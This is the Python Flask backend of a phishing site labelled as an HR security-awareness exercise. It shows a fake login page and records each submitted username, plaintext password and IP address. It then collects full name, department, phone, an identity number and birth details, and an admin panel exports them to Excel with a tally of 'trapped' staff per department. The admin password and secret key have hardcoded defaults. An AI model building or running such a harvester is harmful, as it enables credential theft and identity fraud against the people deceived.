import os
import sqlite3
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file
import openpyxl
from openpyxl.chart import BarChart, Reference

app = Flask(__name__)

app.secret_key = os.environ.get('SECRET_KEY', 'cle_secrete_sensibilisation_rh_2026')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin_1234')

DB_PATH = 'data.db'

# --- Configuration de la Base de Données SQLite ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            fullname TEXT,
            department TEXT,
            phone TEXT,
            cus_num TEXT,
            birth_info TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db_connection():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


# ==========================================
# 1. ROUTES UTILISATEURS
# ==========================================

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/submit-login', methods=['GET', 'POST'])
def submit_login():
    if request.method == 'POST':
        username = request.form.get('username') or request.form.get('email') or ''
        password = request.form.get('password') or ''
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip = request.remote_addr or ''

        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (timestamp, username, password, ip, fullname, department, phone, cus_num, birth_info)
            VALUES (?, ?, ?, ?, '', '', '', '', '')
        ''', (timestamp, username, password, ip))
        conn.commit()
        
        user_id = cursor.lastrowid
        conn.close()

        session['current_user_id'] = user_id

    return redirect(url_for('profile'))

@app.route('/profile')
def profile():
    return render_template('profile.html')

@app.route('/submit-profile', methods=['GET', 'POST'])
def submit_profile():
    if request.method == 'POST':
        user_id = session.get('current_user_id')
        
        # Capture de tous les champs possibles issus du formulaire HTML
        fullname = request.form.get('fullname') or request.form.get('nom') or request.form.get('fullname_postnom') or ''
        department = request.form.get('department') or request.form.get('poste') or ''
        phone = request.form.get('phone') or ''
        cus_num = request.form.get('cus_num') or request.form.get('cus') or ''
        birth_info = request.form.get('birth_info') or request.form.get('naissance') or ''

        if user_id:
            conn = get_db_connection()
            conn.execute('''
                UPDATE logs 
                SET fullname = ?, department = ?, phone = ?, cus_num = ?, birth_info = ?
                WHERE id = ?
            ''', (fullname, department, phone, cus_num, birth_info, user_id))
            conn.commit()
            conn.close()

    return redirect(url_for('success'))

@app.route('/success')
def success():
    return render_template('success.html')


# ==========================================
# 2. ROUTES ADMINISTRATION (PROTÉGÉES)
# ==========================================

@app.route('/admin')
def admin_dashboard():
    if not session.get('is_admin_authenticated'):
        return redirect(url_for('admin_login'))

    conn = get_db_connection()
    logs_rows = conn.execute('SELECT * FROM logs ORDER BY id DESC').fetchall()
    conn.close()

    # Conversion des lignes de la DB en dictionnaires pour Jinja2
    logs = [dict(row) for row in logs_rows]
    return render_template('admin.html', logs=logs)

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['is_admin_authenticated'] = True
            flash('Connexion réussie !', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Mot de passe incorrect.', 'error')

    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('is_admin_authenticated', None)
    flash('Vous avez été déconnecté.', 'info')
    return redirect(url_for('admin_login'))

@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not session.get('is_admin_authenticated'):
        return redirect(url_for('admin_login'))

    conn = get_db_connection()
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()

    flash('Toutes les données ont été effacées.', 'info')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/export-excel')
def export_excel():
    if not session.get('is_admin_authenticated'):
        return redirect(url_for('admin_login'))

    conn = get_db_connection()
    logs_rows = conn.execute('SELECT * FROM logs').fetchall()
    conn.close()

    wb = openpyxl.Workbook()
    ws_data = wb.active
    ws_data.title = "Identifiants"
    ws_data.append(["ID", "Date/Heure", "Identifiant/Email", "Mot de passe", "IP", "Nom & Postnom", "Poste/Département", "Téléphone", "CUS NUM", "Naissance / État Civil"])

    dept_counts = {}
    for log in logs_rows:
        ws_data.append([
            log['id'], log['timestamp'], log['username'], log['password'],
            log['ip'], log['fullname'], log['department'], log['phone'],
            log['cus_num'], log['birth_info']
        ])
        dept = log['department'] or "Non renseigné"
        dept_counts[dept] = dept_counts.get(dept, 0) + 1

    ws_stats = wb.create_sheet(title="Statistiques")
    ws_stats.append(["Département / Poste", "Nombre de piégés"])
    for dept, count in dept_counts.items():
        ws_stats.append([dept, count])

    if dept_counts:
        chart = BarChart()
        chart.type = "col"
        chart.style = 10
        chart.title = "Répartition des pièges"
        chart.y_axis.title = "Nombre"
        chart.x_axis.title = "Poste"

        data = Reference(ws_stats, min_col=2, min_row=1, max_row=len(dept_counts) + 1)
        cats = Reference(ws_stats, min_col=1, min_row=2, max_row=len(dept_counts) + 1)
        chart.add_data(data, titles_from_data=True)
        chart.set_categories(cats)
        ws_stats.add_chart(chart, "D2")

    file_path = "rapport_sensibilisation.xlsx"
    wb.save(file_path)
    return send_file(file_path, as_attachment=True)


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)